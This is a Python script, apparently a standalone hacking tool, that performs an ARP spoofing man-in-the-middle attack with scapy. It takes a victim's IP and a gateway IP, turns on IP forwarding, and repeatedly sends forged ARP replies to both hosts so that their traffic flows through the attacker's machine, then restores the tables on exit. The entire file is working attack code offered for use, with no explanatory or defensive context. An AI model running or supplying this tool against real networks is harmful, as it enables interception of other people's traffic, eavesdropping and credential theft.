#!/usr/bin/env python3
import argparse
import subprocess
import time
import scapy.all as scapy

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter the victim's IP address")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Enter the IP address you want the target to think is you (e.g., router, access point, gateway, etc.)")
    return parser.parse_args()

def get_mac_address(ip_address):
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    request = scapy.ARP(pdst=ip_address)
    response = scapy.srp(broadcast / request, verbose=0, timeout=1, retry=1)[0]
    return response[0][1].hwsrc

def send_spoofed_response(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=0)

def restore_defaults(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip, hwsrc=get_mac_address(spoof_ip))
    scapy.send(packet, verbose=0)

def toggle_ip_forwarding(toggle):
    subprocess.run(["sysctl","-w", "net.ipv4.ip_forward="+str(toggle)], stdout=subprocess.DEVNULL)

def main():
    arguments = get_arguments()
    counter = 0
    toggle_ip_forwarding(1)
    print("[+] Enabling ip_forwarding on this machine...")
    try:
        while True:
            send_spoofed_response(arguments.target, arguments.spoof)
            send_spoofed_response(arguments.spoof, arguments.target)
            time.sleep(4)
            counter += 2
            print("\r[+] Total packets sent: "+str(counter)+".", end="")
    except KeyboardInterrupt:
        print("\n[-] Quitting please wait...")
        print("[+] Restoring default addresses...")
        print("[-] Disabling IP forwarding on this machine...")
        toggle_ip_forwarding(0)
        restore_defaults(arguments.target, arguments.spoof)
        restore_defaults(arguments.spoof, arguments.target)
        print("[+] Restoration Successful!")

if __name__ == '__main__':
    main()
